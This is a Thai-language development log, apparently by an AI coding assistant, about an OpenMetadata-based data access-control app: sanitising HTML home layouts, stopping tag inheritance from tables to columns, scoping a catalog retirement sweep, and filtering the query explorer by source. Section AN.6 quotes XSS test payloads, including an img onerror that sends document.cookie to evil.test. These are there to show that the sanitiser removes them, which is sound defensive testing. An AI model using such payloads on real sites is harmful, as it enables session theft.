> หมายเหตุที่เขียนคอมเมนต์ไว้ใน code แล้วและอย่าไปแก้: **เพดาน 20,000 ตัด "ก่อน" jsoup ทำงาน** — jsoup pretty-print ใส่ newline ต่อ element ทำให้สตริงที่เก็บจริงยาวกว่าเพดานได้ ~12% ตัดทีหลังจะได้ HTML ที่ขาดกลางแท็ก

### AN.6 ยิงจริงกับ backend ที่รันอยู่ — 40 เคส

เขียน `home_e2e.py` ยิง `PUT/GET/DELETE /api/v1/home/layout` ด้วย token จริงของ `analyst_a` และ `admin` (ไฟล์อยู่ใน scratchpad ไม่ได้ commit)

ผลหลังแก้บั๊ก **ผ่านครบ 40** รวมของที่ตั้งใจยิงให้พัง:

```
<p onclick="steal()">hi</p><script>alert(1)</script>
<img src=x onerror="fetch('//evil.test?c='+document.cookie)">
<a href="javascript:alert(2)">click</a><iframe src="//evil.test"></iframe>
```

กลับมาเป็น

```
<p>hi</p><img><a rel="nofollow noopener noreferrer" target="_blank">click</a>
```

และ **แถวใน DB ก็สะอาด** — `HomeLayoutStoreIT.hostileHtmlNeverReachesTheDatabase` อ่าน `SELECT layout::text FROM home_layout` ดิบๆ เพื่อพิสูจน์ข้อนี้ เพราะ sanitiser ที่ล้างแต่ขาออกจะทิ้ง payload ไว้ใน DB ให้ของที่อ่านทีหลัง (report, export, endpoint ในอนาคต) ไปเจอ

เคสอื่นที่ยืนยันแล้ว: preset มั่ว / widget type มั่ว / widget เกิน 24 / `javascript:` ใน link / video host นอก allowlist → **400 ทั้งหมด** · title ยาวเกิน / id ซ้ำ / column นอกช่วง / link เกิน 12 / URL ยาวเกิน → **หนีบให้** · ไม่มี token → **401** · page ของคนหนึ่งไม่ใช่ของอีกคน · `DELETE` คืน default

### AN.7 สิ่งที่ยัง "เหมือนเดิม" โดยตั้งใจ

5 panel เดิมถูก **ยกข้ามมาทั้งดุ้น** ไม่ได้เขียนใหม่ให้ใกล้เคียง — markup เดิมเป๊ะ
banner ด้านบนเปลี่ยนเฉพาะ **ปุ่ม** ให้ตรงกับ account: คนที่เขียน policy ไม่ได้ เคยโดนยื่นปุ่ม `New policy` เป็น action หลัก ซึ่งเป็นปุ่มที่มีไว้ปฏิเสธเขา — ตอนนี้เป็น `Explore the catalog` / `Run a query`

### AN.8 เทสต์

| ชุด | จำนวน |
|---|---|
| `HomeLayoutValidatorTest` | 305 บรรทัด |
| `HomeLayoutStoreTest` | 7 |
| **`HomeLayoutStoreIT`** (Testcontainers) | **6 — ใหม่รอบนี้** |
| `pages/home/layout.test.ts` | 12 |
| `pages/HomePage.test.tsx` | 9 |

---

## รอบก่อนหน้า — 🐛 **ARAK แต่ง metadata ที่ OpenMetadata ไม่มี** — Column Tag เยอะเกินจริง เพราะเรา "ตกทอด" tag ลง column เอง

### AM.1 ผู้ใช้ทักว่า Column Tag ใน ARAK ไม่ตรงกับ OpenMetadata

ผู้ใช้เปิด table `customers` ใน OpenMetadata เทียบกับ ARAK แล้วถามว่า

> `Column Tag ไม่เห็นจะตรงกับที่เห็นใน Arak เลย`
> `ทำไม Column Tag เยอะแยะไปหมด ใน Arak ผิดหรือเปล่า Recheck ให้ดีนะ ตอน ingest ทำงานถูกไหม`

ใน OpenMetadata tab Columns ของ `customers` มี **3 column และ 1 tag ต่อ column พอดี**

| column | tag ใน OpenMetadata |
|---|---|
| `created_at` | `PII.NonSensitive` |
| `id` | `PII.NonSensitive` |
| `name` | `MFEC-PDPA.Sentitive (ข้อมูลส่วนบุคคลอ่อนไหว)` |

ใน ARAK column เดียวกันมีชิปเต็มแถว รวมทั้ง `PII.Sensitive` บน `name` ทั้งที่ OpenMetadata บอกว่า `name` เป็น `MFEC-PDPA` ไม่ใช่ `PII`

#### ตรวจก่อนแก้ — **ingest ไม่ได้ผิด**

ไล่ดูที่ตารางจริงก่อน ไม่เดา:

```bash
MSYS_NO_PATHCONV=1 docker exec dac-appdb psql -U dac -d dac -c "
select target_fqn, facet_type, facet_fqn, depth, is_direct, coalesce(inherited_from,'-')
from asset_facet
where target_fqn like 'dtp-iprm.iprm.public.customers.%'"
```

ได้ **39 แถว** — แต่ในนั้นมี `is_direct = true` อยู่ **3 แถวพอดี** และตรงกับหน้าจอ OpenMetadata ทีละตัว
ที่เหลืออีก 36 แถวคือของที่ **ARAK คิดขึ้นเอง** ไม่ใช่ของที่ดูดมาผิด

> **สรุปให้ผู้ใช้:** การ ingest ถูกต้อง 100% — เก็บมา 3 column, 3 tag ตรงตามต้นทาง ปัญหาอยู่ที่ชั้นคำนวณหลัง ingest

### AM.2 คำถามที่ตามมา และเป็นคำถามที่ถูกต้อง

> `Inherit นี่มันมีด้วยหรอใน Openmetdata ถ้าไม่มี ทำไมต้อง Inherit ด้วยอะ metadata`

คำตอบตรงๆ: **OpenMetadata inherit แค่บางอย่าง ไม่ได้ inherit ทุกอย่าง**

| facet | OpenMetadata ตกทอดลงชั้นล่างไหม |
|---|---|
| **Domain** | ✅ ตกทอด service → database → schema → table |
| **Owners** | ✅ ตกทอด |
| Classification tag | ❌ **ไม่** — tag ผูกกับ entity ที่คนไปติดเท่านั้น |
| Glossary term | ❌ ไม่ |
| Tier / Certification | ❌ ไม่ |

ARAK ไปตกทอด **ทุก facet** ลง column ตาม FR-2A.1 ซึ่งเขียนไว้กว้างเกินจริง → กลายเป็นการ **แต่ง metadata ที่ต้นทางไม่มี**

#### และมันไม่ใช่แค่เรื่องรก — เป็นบั๊กความถูกต้องของ policy

data policy ที่เขียนว่า

```
mask ทุก column ที่  tags contains 'PII'
```

เมื่อ table ติด `PII.Sensitive` ไว้ **ทุก column ของ table นั้นจะ match** → ติด tag ที่ table หนึ่งครั้ง เท่ากับ **null ทั้งตาราง** โดยไม่มีใครตั้งใจ
`created_at` กับ `id` ที่ steward จงใจติด `PII.NonSensitive` ไว้ ก็ยังโดน mask เพราะมันรับ `PII.Sensitive` ของ table มาด้วย

### AM.3 วิธีแก้ — จำกัดให้เหลือเท่าที่ OpenMetadata ทำจริง

`FacetInheritance.effective(...)` เพิ่ม allow-list แล้วกรองที่ต้นทาง

```java
/**
 * The facet types that cross from one asset to the one below it.
 *
 * <p>Chosen to match OpenMetadata's behaviour rather than to be generous. ...
 */
private static final Set<FacetType> INHERITABLE =
    EnumSet.of(
        FacetType.DOMAINS,
        FacetType.DATA_PRODUCTS,
        FacetType.OWNERS,
        FacetType.CUSTOM_PROPERTY);
```

```java
for (ExtractedFacet facet : level.facets()) {
  if (!INHERITABLE.contains(facet.facetType())) {
    continue;
  }
  ...
}
```

**ทำไมเก็บ `CUSTOM_PROPERTY` ไว้ ทั้งที่ OpenMetadata ไม่ตกทอด** — เพราะ OpenMetadata นิยาม custom property ต่อ entity type และ **column ถือ custom property ไม่ได้เลย** ถ้าไม่ตกทอด expression

```
user.country == asset.prop('dataResidency')
```

จะเขียนที่ระดับ column ไม่ได้ตลอดกาล (FR-2A.4) — และ `AssetContextLoader` อ่าน `asset_facet` ด้วย `target_fqn` ตรงๆ **ไม่มี fallback จาก column ขึ้นไปหา table** จึงต้องตกทอดไว้

#### ⚠️ ของที่ **ไม่ได้** แตะ — tag ancestor ยังกางเหมือนเดิม

อย่าสับสนสองอย่างนี้ ทั้งคู่สร้างแถวที่ `is_direct = false` เหมือนกัน:

| | ตัวอย่าง | `inherited_from` | สถานะ |
|---|---|---|---|
| **tag ancestor** (`FacetExtractor.ancestorsOf`) | `PII.NonSensitive` ⇒ `PII` depth 1 | `NULL` | **คงไว้** — คือประโยคเดิมอ่านหยาบลง และ selector `classifications contains 'PII'` พึ่งมัน (FR-2A.2) |
| **parent→child inheritance** (`FacetInheritance.effective`) | tag ของ table ⇒ ทุก column | `<fqn ของชั้นบน>` | **จำกัดแล้ว** |

#### ลบ dead code ที่ตามมา

เมื่อไม่มี facet ตระกูล tag เหลือใน `INHERITABLE` แล้ว กลไก mutual-exclusion (`blockedByOverride`, `exclusiveRootsHeldBy`, set `settled`) **วิ่งไม่ถึงอีกต่อไป** → ลบทิ้ง ไม่ทิ้งไว้ให้คนอ่านหลงว่ายังทำงาน
พารามิเตอร์ `mutuallyExclusiveRoots` ยังรับไว้ (ผู้เรียกส่งมา) แต่ javadoc ระบุชัดว่าไม่ได้ใช้แล้วและทำไม

> **หมายเหตุ:** อันนี้ **ต่างจากแผน FR-2A.1** ที่เขียนว่า "union ของที่ผูกตรง + ที่ตกทอดมาจากชั้นบน" ทำตามคำสั่งผู้ใช้ที่ว่าอย่าไปแต่ง metadata ที่ต้นทางไม่มี — ถ้าจะกลับ แก้ที่ `INHERITABLE` บรรทัดเดียว

### AM.4 ฝั่งหน้าจอ — column row ไม่ต้องพูดซ้ำสิ่งที่ table พูดไปแล้ว

หลังแก้ backend column ยังเหลือชิปอยู่ 8 ตัว เพราะหน้า Columns วาด facet **ทุกแถว** ที่ถึง column รวม domain 3 ชั้นกับ owner 2 คนของ table ซ้ำทุกบรรทัด — ตาราง 352 column ก็คือพูดเรื่องเดิม 352 รอบ

เพิ่ม `columnFacets()` ใน `facets.tsx`

```ts
export function columnFacets(facets: FacetRow[]): FacetRow[] {
  return listFacets(facets.filter((facet) => !facet.inheritedFrom));
}
```

- `!facet.inheritedFrom` → ตัดของที่รับมาจาก table (table วาดไว้แล้วข้างบน)
- `listFacets()` → ม้วน ancestor ที่ materialize ไว้ (`PII.NonSensitive` ไม่ต้องมี `PII` เปล่าๆ ต่อท้าย) และตัด `classifications` / `tier` ที่ซ้ำกับ tag

subtitle เปลี่ยนจาก `N carrying a facet` เป็น `N carrying governance of their own` เพราะตัวเลขเปลี่ยนความหมายไปแล้ว

### AM.5 ผลจริงหลังแก้ — ตรงกับ OpenMetadata ทีละตัว

re-crawl แล้วอ่านทั้ง DB และ API:

```
created_at -> ['PII.NonSensitive', 'PII']
id         -> ['PII.NonSensitive', 'PII']
name       -> ['MFEC-PDPA.Sentitive (ข้อมูลส่วนบุคคลอ่อนไหว)', 'MFEC-PDPA']
```

- **39 แถว → 24 แถว** ที่ระดับ column
- `PII.Sensitive` กับ `Tier.Tier2` ของ table **ไม่ไหลลง column อีกแล้ว**
- ที่เหลือคู่กับ tag ของตัวเองคือ ancestor ของ tag ตัวนั้นเอง (`PII`, `MFEC-PDPA`) ซึ่งคงไว้ให้ selector — และหน้าจอม้วนทิ้ง เหลือ **ชิปเดียวต่อ column ตรงกับ OpenMetadata**

### AM.6 เทสต์ที่เขียนใหม่

`FacetInheritanceTest` เขียนใหม่ทั้งไฟล์ แบ่ง `@Nested` 2 ก้อนตามสัญญา 2 ข้อ:

| `Inherited` — *ที่ OM ตกทอด เราตกทอด* | `NotInherited` — *ที่ OM ไม่ตกทอด เราไม่แต่งขึ้น* |
|---|---|
| `inheritsDownwards` | `tagsDoNotDescend` |
| `namesTheSource` | `ownColumnTagSurvivesAlone` |
| `nearestAncestorWins` | `theRestOfTheTagFamilyStaysPut` (TIER + CLASSIFICATIONS + TERMS) |
| `ownRowWins` | `tagsDoNotDescendBetweenAssets` |
| `customPropertiesReachColumns` | |

`AssetCrawlerTest` — 3 เทสต์ที่ assert พฤติกรรมเดิมถูกเขียนใหม่ให้ใช้ **domain** (facet ที่ตกทอดจริง) แทน tag และเพิ่มตัวใหม่

- `untaggedColumnsAreStillCovered` → **`untaggedColumnsStayUntagged`** (`.isEmpty()`)
- `columnOverridesInheritedTier` → **`columnKeepsOnlyItsOwnTag`**
- ใหม่ **`domainDescendsWhereTagsDoNot`** — level เดียว ใส่ทั้ง tag และ domain แล้ว assert ผลลัพธ์ต่างกัน 2 แบบใน crawl เดียว

ฝั่งหน้าจอเพิ่ม **`a column does not repeat what it inherited from its table`** — ให้ column `id` ถือแค่ domain ที่รับมาจาก table แล้ว assert ว่าแถวนั้นวาด `—` ไม่ใช่ชิป `Finance`

### AM.7 ผลรันจริงรอบนี้

```bash
export JAVA_HOME=".tools/jdk-21.0.12.1+1"

./mvnw -o -pl backend/dac-connector-openmetadata -am test
# → 91 tests, Failures: 0   (AssetCrawlerTest 6 · FacetInheritanceTest 9)

./mvnw -o test
# → BUILD SUCCESS ทุก module

./mvnw -o verify -Pintegration
# → 132 integration tests, Failures: 0
#   ตัวที่อ่าน asset_facet ผ่านหมด: AssetStoreIT 7 · CatalogQueryIT 18 ·
#   PolicyBindingMaterializerIT 10 · ImpactAnalysisIT 8 · PolicyOverviewIT 24 ·
#   GrantCompositionIT 17

cd frontend/app && npx tsc --noEmit    # → exit 0
cd frontend/app && npx jest            # → 21 suites / 129 tests ผ่านหมด
cd frontend/app && MSYS_NO_PATHCONV=1 VITE_BASE=/Arak/ npx vite build   # → ✓ built
```

restart backend แล้ว **Flyway migrate V13 + V14 สำเร็จ** (`now at version v14`) และ re-crawl ผ่าน `POST /api/v1/sync/openmetadata` — 33 tables / 352 columns / 1817 facet rows

### AM.8 ไฟล์ที่แตะรอบนี้

| ไฟล์ | ทำอะไร |
|---|---|
| `backend/dac-connector-openmetadata/.../facet/FacetInheritance.java` | เพิ่ม `INHERITABLE` + guard, ลบ dead mutual-exclusion, เขียน javadoc ใหม่ |
| `backend/dac-connector-openmetadata/.../facet/FacetInheritanceTest.java` | เขียนใหม่ทั้งไฟล์ — 2 `@Nested` / 9 เทสต์ |
| `backend/dac-connector-openmetadata/.../crawl/AssetCrawlerTest.java` | 3 เทสต์เปลี่ยนไปใช้ domain, +1 เทสต์ใหม่ |
| `frontend/app/src/pages/catalog/facets.tsx` | เพิ่ม `columnFacets()` |
| `frontend/app/src/pages/catalog/AssetDetailPage.tsx` | column row ใช้ `columnFacets()`, แก้ subtitle |
| `frontend/app/src/pages/catalog/AssetDetailPage.test.tsx` | แก้ 2 assertion + เพิ่มเทสต์ใหม่ |

### AM.9 ต่อจากนี้ (ค้างอยู่ ยังไม่ได้เริ่ม)

1. **หน้าแรกของ Requestor** — ไม่ต้องเห็น policy/governance widget ให้เป็นหน้า global search แบบหน้าแรก OpenMetadata แต่เข้า theme เรา และยัง customize ได้
2. **หน้า Your Profile — การ์ด Attributes** ยังไม่สวย ต้องจัดใหม่
3. **OpenMetadata connection ให้แก้ instance / credential ได้จากหน้าจอ** — ออกแบบไว้แล้ว (`V15__openmetadata_connection.sql`, `OmConnectionStore`, `OpenMetadataClient.reconfigure`, `WebhookResource` รับ `Supplier<String>`) แต่ยังไม่ได้เขียน
4. **Home dashboard ฝั่ง frontend** — backend + 26 เทสต์เสร็จแล้ว frontend มีแค่ `api/home.ts`
5. **ยังไม่ได้ commit** — local ยังนำ `origin/main` อยู่ 5 commit

---

## รอบก่อนหน้า — 🐛 **บั๊กจริงที่ลบข้อมูลทดสอบทิ้งทั้งชุด (`demo-pg` หาย + query ถูกปฏิเสธ)** · **Query Explorer เห็นเฉพาะ source ที่ต่อไว้จริง** · และ **Roadmap เพิ่ม M9 Access Request Management**

### AL.1 🐛 บั๊กที่ทำให้ `demo-pg` หายและทุก query ขึ้น "is not a governed asset"

ผู้ใช้รายงานสองเรื่องในนาทีเดียวกัน — query ขึ้น

```
Refused
public.assignments is not a governed asset on this source, so no policy could be applied to it
```

และ "`demo-pg` ที่เอาไว้ทดสอบหายไปไหนหมดเลยอะ"

**มันคือบั๊กตัวเดียวกัน** และเป็นบั๊กความถูกต้องจริง ไม่ใช่ config หาย

`AssetStore.finished(stats)` คือ retirement sweep ที่ปิด asset ที่ crawl รอบนี้ไม่ได้แตะ โค้ดเดิมคิดเรื่อง **crawl ที่ไม่สมบูรณ์** มาอย่างดี (ถ้า crawl เขียนอะไรไม่ได้เลย จะไม่กวาด) แต่**ไม่ได้คิดเรื่องขอบเขตเลย** — ทั้ง 6 statement ใช้เงื่อนไขเดียว:

```sql
WHERE is_current AND (last_seen_at IS NULL OR last_seen_at < :seen)
```

catalog ของเราเก็บ asset จาก **3 ที่**: `openmetadata` (crawl), `discovered` (`SourceCatalogImporter` ที่ introspect JDBC เอง), `local` (ทำมือ)
→ crawl OpenMetadata หนึ่งรอบจึง **ปิด asset ของอีกสองพวกทิ้งหมด** เพราะ OpenMetadata ไม่มีทางเอ่ยถึงมันอยู่แล้ว และที่หนักกว่าคือ **ลบแถว `asset_fqn_map` ทิ้งตรงๆ**

ผลที่ตามมาเป็นลูกโซ่:

| | |
|---|---|
| `asset_fqn_map` | เหลือ **0 แถว** |
| `demo-pg.salesdb.sales.customer` | `is_current = f`, `valid_to = 2026-09-23 13:19:44+00` (ระหว่าง session นี้เอง) |
| `provenance` | `discovered/f/4` · `openmetadata/t/36` |
| policy 14 ตัว | ผูกกับ asset ที่ไม่ current แล้ว → เงียบหมด |
| `QueryService` | resolve ไม่เจอ → คืน `null` |
| `QueryRewriter` | โยน `RefusedException` "is not a governed asset on this source" |

**ข้อความ error จึงอ่านเหมือนเป็นคำตัดสินของ policy แต่จริงๆ คือ cache row ที่ถูกลบไปแล้ว** — นี่คือส่วนที่อันตรายที่สุดของบั๊กตัวนี้

**FR-1.7 เขียนไว้ว่า sync ห้ามทับของ local** ข้อนี้ต้องใช้กับตัว asset เองด้วย ไม่ใช่แค่ tag บนมัน และ `deploy/seed/app/02-demo-facets.sql` ก็เขียนคอมเมนต์ไว้เองว่า *"the next OpenMetadata sync must leave them alone rather than 'correct' them out of existence"* ซึ่งคือสิ่งที่ sweep ละเมิดพอดี

**แก้:** ทั้ง 6 statement เติม scope `provenance = 'openmetadata'`

```sql
DELETE FROM asset_facet WHERE column_id IN (
    SELECT c.id FROM asset_column c
      JOIN asset a ON a.id = c.asset_id
     WHERE a.provenance = 'openmetadata'
       AND c.is_current
       AND (c.last_seen_at IS NULL OR c.last_seen_at < :seen))
```

```sql
UPDATE asset SET is_current = false, valid_to = :seen
WHERE provenance = 'openmetadata' AND is_current
  AND (last_seen_at IS NULL OR last_seen_at < :seen)
```

(รูปเดียวกันกับ `asset_owner`, `asset_fqn_map`, `asset_column`)

**พิสูจน์ว่าเทสต์จับได้จริง ไม่ใช่เขียนตามโค้ด** — `AssetStoreIT.sweepSparesOtherProvenances()` มือเขียน `data_source` + asset `provenance='discovered'` + column + `asset_fqn_map` แล้วรัน OM crawl เต็มๆ สองรอบ จากนั้น:

```bash
git stash push backend/.../AssetStore.java   # เอาเฉพาะตัวแก้ออก
# → Tests run: 1, Failures: 1 · expected: 1 but was: 0 · AssetStoreIT.java:369
git stash pop
# → Tests run: 7, Failures: 0
```

**กู้ข้อมูลคืนแล้ว** — build jar ใหม่ → restart → `POST /v1/sources/{id}/introspect` (1 table, 9 columns, `asset_fqn_map` กลับมาเป็น `MATCHED`) → รัน `02-demo-facets.sql` ซ้ำ (10 facets กลับมา)
พิสูจน์ปลายทาง: query `SELECT * FROM sales.customer` ในนาม `analyst_a` ตอนนี้ได้

```
Access to demo-pg.salesdb.sales.customer is denied.
finance-subscription did not apply: outside the policy's permitted time window
```

ซึ่งคือ **คำตัดสินของ policy จริง** (หน้าต่าง 08:00–18:00 Asia/Bangkok, ตอนนั้น 20:40) แปลว่า resolve + evaluate กลับมาทำงานครบวงแล้ว

---

### AL.2 Query Explorer — เห็นเฉพาะ source ที่ ARAK ต่อไว้จริง

ผู้ใช้สั่ง: *"ใน Query Explorer ถ้า Arak ไม่ได้ต่อ Source นั้นไว้ ก็ไม่ต้องขึ้นให้เห็นสิ"*

ของเดิมกรองด้วย **OM service FQN** (`asset.fqn.startsWith(serviceFqn + '.')`) ซึ่งพังสองชั้น:
1. กรองที่ **หน้าจอ** หลังจากดึงมาแล้ว 500 แถว → ถ้า catalog ใหญ่กว่านั้น จะได้ slice มั่วๆ ของ source เดียว
2. `demo-pg` ถูก discover ผ่าน JDBC ไม่มี `om_service_fqn` เลย → `serviceFqn` เป็นค่าว่าง → **ตัวกรองไม่ทำงานเลย** แล้วเสนอ table ของ `dtp-iprm` ครบ 36 ตัว ทั้งที่ ARAK ไม่มี connection ไปหามัน กดเมื่อไหร่ก็ได้ refusal เมื่อนั้น

**เกณฑ์ที่ถูกคือแถวเดียวกับที่ query proxy ใช้ resolve** คือ `asset_fqn_map` → สิ่งที่ list เสนอ กับสิ่งที่ query เอื้อมถึง จะเป็นเซตเดียวกัน**โดยโครงสร้าง** ไม่ใช่โดยข้อตกลง

```java
 AND (a.data_source_id = :sourceId
      OR EXISTS (SELECT 1 FROM asset_fqn_map m
                 WHERE m.data_source_id = :sourceId
                   AND m.verification_status <> 'ORPHANED'
                   AND (m.om_fqn = a.fqn
                        OR m.om_fqn LIKE a.fqn || '.%')))
```

สองแขนเพราะมีสอง importer: crawl เขียน `asset_fqn_map` (และตั้ง `data_source_id` ให้เมื่อ `om_service_fqn` ตรงกับ source ที่ register ไว้) ส่วน JDBC importer ตั้ง `data_source_id` บน asset ตรงๆ โดยไม่มี service FQN เลย
แขนที่สอง (`LIKE a.fqn || '.%'`) คือสิ่งที่ทำให้แถว service / database / schema ยังอยู่ในต้นไม้ — มันไม่มี mapping ของตัวเอง และต้นไม้ที่มีแต่ใบไม่มีกิ่งก็ไม่ใช่ต้นไม้

| ชั้น | ทำอะไร |
|---|---|
| `CatalogResource` | `@QueryParam("sourceId")` → parse เป็น UUID · **malformed = 400 ไม่ใช่เงียบ** (ต่างจาก facet ที่ ignore) เพราะค่านี้มาจาก picker ไม่ได้มาจากคนพิมพ์ และการ "ขยายรายการกลับไปเป็นทุก database" คือความล้มเหลวที่ตัวกรองนี้มีไว้กัน |
| `CatalogQuery.assets(...)` | รับ `UUID sourceId` เพิ่ม |
| `client.ts` | `AssetQuery.sourceId` + `params.set('sourceId', ...)` |
| `SchemaExplorer` | รับ `sourceId` แทน `serviceFqn` · ใส่ใน `queryKey` · `enabled: Boolean(sourceId)` · **ตัดการกรองฝั่ง client ทิ้ง** |
| `QueryPage:204` | ส่ง `sourceId={effectiveSource || null}` |

**empty state พูดความจริงแยกเป็น 3 แบบ** — ยังไม่เลือก source / เลือกแล้วแต่ค้นไม่เจอ / **เลือกแล้วแต่ ARAK ยังไม่เคยอ่าน catalog ของ source นี้ → บอกให้ไป introspect** (ของเดิมเขียนรวมว่า "Nothing in the catalog matches" ซึ่งโยนความผิดให้ผู้ใช้ทั้งที่เป็นงานที่ระบบยังไม่ได้ทำ)

**เทสต์ 3 ตัวใหม่ใน `CatalogQueryIT` (18/18 เขียว):**
- `narrowsToOneSource` — ครอบทั้งสองแขน: asset ที่ crawl map ไว้ กับ asset ที่ JDBC importer เป็นเจ้าของ และต้องไม่ปนกัน
- `narrowsToNothingWhenTheSourceHasNoMapping` — source ที่ยังไม่เคย introspect ต้องว่าง **ไม่ใช่โชว์ของ source อื่น**
- `hidesServicesWithNoRegisteredSource` — **เคสที่ผู้ใช้เจอจริง**: `dtp-iprm` ยังอยู่ในหน้า Catalog (ถูกแล้ว — policy author ควรเห็น) แต่ต้องหายจากตัวที่สัญญาว่าจะรัน query ให้

**พิสูจน์กับระบบจริง:** catalog มี **40** asset · กรองด้วย `sourceId` ของ `demo-pg` เหลือ **4** (`demo-pg` → `salesdb` → `sales` → `customer`) — `dtp-iprm` หายจาก explorer หมดแล้ว

> ⚠️ **หมายเหตุที่จงใจไม่ทำ:** ไม่ได้ซ่อน asset ที่ mapping เป็น `ORPHANED` ออกจาก list ทั้งที่ proxy จะ refuse มัน — `ORPHANED` แปลว่า "เจอ drift" ไม่ใช่ "ไม่ได้ต่ออยู่" การซ่อน table เงียบๆ ตอน drift แย่กว่าการโชว์แล้วให้ refusal อธิบายตัวเอง (แขน mapping ยังเช็ค `<> 'ORPHANED'` อยู่ เพราะ mapping ที่ orphan ไม่ใช่หลักฐานว่าเอื้อมถึง แต่แขน `data_source_id` เป็นหลักฐานตรงว่าสังกัด)

---

### AL.3 Roadmap — เพิ่ม **M9 Access Request Management** ให้เห็นชัด

ผู้ใช้ถามว่า *"ขาด Request Access Workflow หรือเปล่านะ / Access Request Management / ใส่ไปใน Roadmap ด้วยนะ"*

**ไม่ได้ขาดโดยอุบัติเหตุ** — แผนที่อนุมัติไว้ (FR-7) เลื่อนไป Phase 2 ตั้งแต่ต้น และ **Phase 1 วาง schema รอไว้แล้วจริง** เพื่อไม่ต้อง migrate ทีหลัง:

| ที่เตรียมไว้แล้ว | อยู่ตรงไหน |
|---|---|
| `grant.source` = `manual` \| `request` + `request_id` (nullable) | `V11__access_grant.sql` |
| `requiresApproval` · `approvers` · `validUntil` ใน policy model | Policy IR (JSON Schema) ตั้งแต่ M3 |
| auto-revoke เมื่อหมดอายุ + audit trail | ปิดไปแล้วรอบ AD.1 |
| `asset_owner` (user/team + `is_direct` + `inherited_from`) | ใช้ route หา approver ได้ทันที |

→ ใส่เป็น **M9** ในตาราง Current Progress แล้ว เพื่อให้มันอยู่ใน roadmap ไม่ใช่อยู่แต่ในไฟล์แผน

---

### AL.4 ไฟล์ที่แตะรอบนี้

| ไฟล์ | ทำอะไร |
|---|---|
| `backend/.../catalog/AssetStore.java` | **scope sweep เป็น `provenance = 'openmetadata'` ทั้ง 6 statement** + javadoc อธิบายว่าทำไม |
| `backend/.../catalog/CatalogQuery.java` | `assets(...)` รับ `UUID sourceId` + ตัวกรองสองแขน |
| `backend/.../resources/CatalogResource.java` | `@QueryParam("sourceId")` + 400 เมื่อ malformed |
| `backend/.../test/.../AssetStoreIT.java` | `sweepSparesOtherProvenances()` (7/7) |
| `backend/.../test/.../CatalogQueryIT.java` | 3 เทสต์ source filter + อัปเดต call site (18/18) |
| `frontend/app/src/api/client.ts` | `AssetQuery.sourceId` |
| `frontend/app/src/pages/query/SchemaExplorer.tsx` | กรองที่ server · empty state 3 แบบ |
| `frontend/app/src/pages/query/QueryPage.tsx` | ส่ง `sourceId` |

### AL.5 ผลรันจริงรอบนี้

| ชุด | ผล |
|---|---|
| `AssetStoreIT` | **7/7** (+1) · และพิสูจน์ว่าแดงเมื่อถอดตัวแก้ออก |
| `CatalogQueryIT` | **18/18** (+3) |
| `npx tsc --noEmit` | exit 0 |
| `npx jest` | **21 suites / 126 tests** เขียว |
| `VITE_BASE=/Arak/ npx vite build` | ✓ built in 8.08s |
| ยิง API จริง | catalog 40 asset → กรอง `demo-pg` เหลือ 4 |

### AL.6 ต่อจากนี้

คิวที่ผู้ใช้สั่งไว้และยังไม่ได้ทำ — จัดกลุ่มชิป Governance ตาม type · ปุ่ม Query ในหน้า asset · **หน้า Catalog แสดงเป็นกล่องความสูงเท่ากันแบบ OpenMetadata + paging (แต่เก็บ filter เดิมไว้)** · ดูด `description` เข้า search + เพิ่ม field `experts` / `reviewers` / `retentionPeriod` / `sourceUrl` / `tableType` · แล้วค่อยกลับไป M5 slice 2 (`V12__row_entitlement.sql`)

---

## รอบก่อนหน้า — **M5 slice 1: `ViewCompiler` เสร็จ** · **เคอร์เซอร์เป็นรูปมือทั้งแอป (กวาดทีเดียว 20 ปุ่ม)** · และ **Analyst A/B/C ล็อกอินได้จริงแล้ว**

### AK.1 `ViewCompiler` — โจทย์คือ "view ใบเดียว แต่ `PolicyDecision` เป็นของรายคน"

Secure view เป็น **object เดียวที่เสิร์ฟคนทั้งองค์กร** แต่ `PolicyDecision` ที่ engine คืนมาเป็นของ principal คนเดียว
ถ้าเอา decision ของ `analyst_a` ไป compile ตรงๆ จะได้ view ที่ hard-code สิทธิ์ของ `analyst_a` แล้วคนอื่นเห็นข้อมูลของ `analyst_a` หมด

**ทางออก: compile จาก *โครงสร้าง* ของ decision แล้วโยนค่าที่ขึ้นกับคน ไปเป็น lookup ตอน runtime**
ค่าที่ขึ้นกับคนทุกตัวย้ายไปอยู่ในตาราง ACL 3 ใบบน source:

| ตาราง | คีย์ | ตอบคำถามว่า |
|---|---|---|
| `acl.asset_subscription` | `(principal, asset)` | คนนี้เห็น table นี้ได้ไหม |
| `acl.row_entitlement` | `(principal, asset, entitlement_key, value)` | คนนี้เห็นแถวที่ค่าเท่ากับอะไรบ้าง |
| `acl.column_grant` | `(principal, asset, column_name, treatment)` | คนนี้เห็น column นี้ในรูปแบบไหน |

view ที่ออกมาจึงไม่มี literal ของใครอยู่เลย — ทุก gate เป็น `EXISTS (SELECT 1 FROM acl.… WHERE principal = CURRENT_USER …)`

**การตัดสินใจ 4 ข้อที่ต้องจำ:**

1. **`ALWAYS_FALSE` ไม่เขียน `1 = 0` ลง view** — view ใบนี้เสิร์ฟทุกคน ถ้าเขียน `1 = 0` ลงไปคือ table หายทั้งใบสำหรับทุกคน
   วิธีปฏิเสธคนคนเดียวคือ **ไม่ใส่แถวให้เขาใน `asset_subscription`** แล้ว gate ตัวแรกปิดเอง
2. **mask เรียงจากเข้มสุดลงมา และ `ELSE` คือตัวที่เข้มที่สุด** — ไม่มี grant = ได้ของที่เข้มที่สุด (fail-closed ตาม FR-5.1)
   **`PLAIN` เป็น treatment ที่ต้องถูก grant เหมือนกัน** ไม่ใช่ค่า default
3. **hidden column หายจาก view สำหรับทุกคน** — view ใบเดียวมี column list ชุดเดียว บังคับ per-principal ไม่ได้ → มี note เตือนตรงๆ (FR-4.5)
4. **operator ที่ lookup table แทนไม่ได้ (`GT/GTE/LT/LTE/CONTAINS/STARTS_WITH/MATCHES`) → ปิด view ทิ้ง** (`(1 = 0)`) พร้อม `Unenforceable{suggestedMode = PROXY}`
   **ห้ามเงียบๆ ตัด filter ทิ้งแล้วปล่อยผ่าน** — นั่นคือข้อมูลหลุด

`ViewCompiler.treatmentKey(MaskingSpec, String condition)` เป็น `public static` **โดยตั้งใจ** — slice 2 (`row_entitlement` maintainer) ต้องคำนวณคีย์เดียวกันเป๊ะ ห้ามเขียนใหม่ซ้ำ
คีย์เป็น `FUNCTION#<sha256 4 ไบต์แรก>` ของทุกพารามิเตอร์ของ mask → **ตัวคีย์เองไม่พก plaintext ของ mask ติดไปด้วย** (มีเทสต์ยืนยัน)

